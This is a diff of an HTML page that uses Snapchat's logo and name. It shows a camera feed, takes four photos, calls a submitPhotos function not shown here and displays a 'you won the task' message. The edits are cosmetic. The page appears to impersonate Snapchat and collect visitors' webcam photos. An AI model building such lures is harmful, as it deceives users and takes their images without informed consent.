@@ -37,9 +37,7 @@
       flex-direction: column;
     }
 
-    #camera {
-      transform: scaleX(-1);
-    }
+    #camera { transform: scaleX(-1); }
 
     @keyframes glow {
       0% { filter: drop-shadow(0 0 4px yellow); }
@@ -47,29 +45,25 @@
       100% { filter: drop-shadow(0 0 4px cyan); }
     }
 
-    .animate-glow {
-      animation: glow 3s infinite;
-    }
+    .animate-glow { animation: glow 3s infinite; }
 
     @keyframes popup {
       0% { transform: scale(0.5); opacity: 0; }
       100% { transform: scale(1); opacity: 1; }
     }
 
-    .animate-popup {
-      animation: popup 0.5s ease-out;
-    }
+    .animate-popup { animation: popup 0.5s ease-out; }
   </style>
 </head>
 <body class="flex flex-col items-center justify-center min-h-screen">
 
-  <!-- Animated Logo & Text -->
+  <!-- Logo -->
   <div class="flex flex-col items-center mb-6">
-    <img src="https://raw.githubusercontent.com/ankitsuraj/snapbox-app/refs/heads/main/pngimg.com%20-%20snapchat_PNG33.png" class="w-24 animate-glow" alt="Snapchat Logo" />
+    <img src="https://raw.githubusercontent.com/ankitsuraj/snapbox-app/refs/heads/main/pngimg.com%20-%20snapchat_PNG33.png" class="w-24 animate-glow" />
     <p class="text-white font-bold text-lg mt-2">Snapchat</p>
   </div>
 
-  <!-- Live Camera -->
+  <!-- Camera -->
   <div class="animated-border mb-4">
     <video id="camera" autoplay playsinline class="w-64 h-96 object-cover rounded-xl shadow-xl"></video>
   </div>
@@ -77,7 +71,7 @@
   <!-- Capture Button -->
   <button onclick="capturePhoto()" class="bg-white text-black font-bold px-6 py-2 rounded-xl hover:bg-yellow-300 transition mb-4">📸 Capture</button>
 
-  <!-- Preview Boxes -->
+  <!-- Previews -->
   <div id="previewBoxes" class="grid grid-cols-2 gap-4 mb-6">
     <div class="animated-border"><div class="preview-box">Tap 1</div></div>
     <div class="animated-border"><div class="preview-box">Tap 2</div></div>
@@ -85,13 +79,13 @@
     <div class="animated-border"><div class="preview-box">Tap 4</div></div>
   </div>
 
-  <!-- Action Buttons -->
+  <!-- Actions -->
   <div class="flex gap-4 mb-4">
     <button onclick="downloadAllPhotos()" class="bg-blue-500 hover:bg-blue-600 px-6 py-2 rounded-xl font-bold text-white transition">⬇️ Download All</button>
     <button onclick="resetAll()" class="bg-red-500 hover:bg-red-600 px-6 py-2 rounded-xl font-bold text-white transition">🔄 Reset</button>
   </div>
 
-  <!-- Centered Popup Message -->
+  <!-- Popup -->
   <div id="msg" class="hidden fixed inset-0 flex items-center justify-center z-50">
     <div class="bg-green-500 text-white text-xl font-bold px-8 py-4 rounded-xl shadow-2xl animate-popup">
       🎉 Congratulations! You won the task!
@@ -135,7 +129,6 @@
       capturedImages.push(blob);
 
       currentIndex++;
-
       if (currentIndex === 4) submitPhotos();
     }
 
